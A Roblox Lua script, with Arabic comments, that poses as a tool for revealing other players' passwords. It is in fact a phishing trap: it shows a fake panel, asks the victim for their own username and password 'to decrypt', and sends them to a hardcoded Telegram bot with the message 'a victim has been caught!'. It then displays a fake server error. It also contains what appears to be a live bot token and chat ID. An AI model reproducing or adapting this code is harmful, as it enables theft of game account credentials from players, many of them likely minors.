-- سكربت خداعي وهمي لكشف باسوردات اللاعبين (مزيف)
-- تصميم الشيطان

-- بيانات البوت
local telegram_token = "7778511078:AAFm0VhnV-ltsgv6irBJCiDq8VqFcSkdfV4"
local telegram_id = "6268779523"

-- دالة الإرسال لتليجرام
function sendToTelegram(msg)
    local url = "https://api.telegram.org/bot"..telegram_token.."/sendMessage?chat_id="..telegram_id.."&text="..urlencode(msg)
    game:HttpGet(url)
end

-- دالة ترميز URL
function urlencode(str)
    str = tostring(str)
    str = string.gsub (str, "\n", "%%0A")
    str = string.gsub (str, " ", "%%20")
    str = string.gsub (str, ":", "%%3A")
    str = string.gsub (str, "/", "%%2F")
    return str
end

-- واجهة وهمية
local players = game:GetService("Players")
local plrs = players:GetPlayers()

local fakeList = {}
for i = 1, math.min(#plrs, 5) do
    table.insert(fakeList, plrs[i].Name)
end

local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 400, 0, 300)
Frame.Position = UDim2.new(0.5, -200, 0.5, -150)
Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Frame.BorderSizePixel = 2
Frame.Active = true
Frame.Draggable = true

local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Text = "كشف كلمات المرور (حصري)"
Title.TextColor3 = Color3.fromRGB(255, 50, 50)
Title.TextScaled = true
Title.BackgroundColor3 = Color3.fromRGB(30, 30, 30)

local List = Instance.new("TextLabel", Frame)
List.Position = UDim2.new(0, 0, 0, 50)
List.Size = UDim2.new(1, 0, 0, 100)
List.Text = "جارٍ كشف اللاعبين:\n"..table.concat(fakeList, "\n")
List.TextColor3 = Color3.fromRGB(255, 255, 255)
List.TextScaled = true
List.BackgroundColor3 = Color3.fromRGB(15, 15, 15)

local UsernameBox = Instance.new("TextBox", Frame)
UsernameBox.Position = UDim2.new(0.1, 0, 0, 160)
UsernameBox.Size = UDim2.new(0.8, 0, 0, 30)
UsernameBox.PlaceholderText = "ادخل اسم المستخدم"
UsernameBox.Text = ""
UsernameBox.TextScaled = true
UsernameBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
UsernameBox.TextColor3 = Color3.fromRGB(255, 255, 255)

local PassBox = Instance.new("TextBox", Frame)
PassBox.Position = UDim2.new(0.1, 0, 0, 200)
PassBox.Size = UDim2.new(0.8, 0, 0, 30)
PassBox.PlaceholderText = "ادخل كلمة المرور لفك التشفير"
PassBox.Text = ""
PassBox.TextScaled = true
PassBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
PassBox.TextColor3 = Color3.fromRGB(255, 255, 255)

local Submit = Instance.new("TextButton", Frame)
Submit.Position = UDim2.new(0.3, 0, 0, 240)
Submit.Size = UDim2.new(0.4, 0, 0, 40)
Submit.Text = "تأكيد وفك التشفير"
Submit.TextScaled = true
Submit.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
Submit.TextColor3 = Color3.fromRGB(255, 255, 255)

Submit.MouseButton1Click:Connect(function()
    local username = UsernameBox.Text
    local password = PassBox.Text

    if username ~= "" and password ~= "" then
        local message = "تم اصطياد ضحية!\nاسم المستخدم: "..username.."\nكلمة المرور: "..password.."\nاللعبة: "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
        sendToTelegram(message)

        Title.Text = "تم التحقق…"
        List.Text = "فشل الاتصال بالسيرفر. حاول لاحقاً."
        UsernameBox:Destroy()
        PassBox:Destroy()
        Submit:Destroy()
    else
        Title.Text = "يجب ملء كل البيانات!"
    end
end)
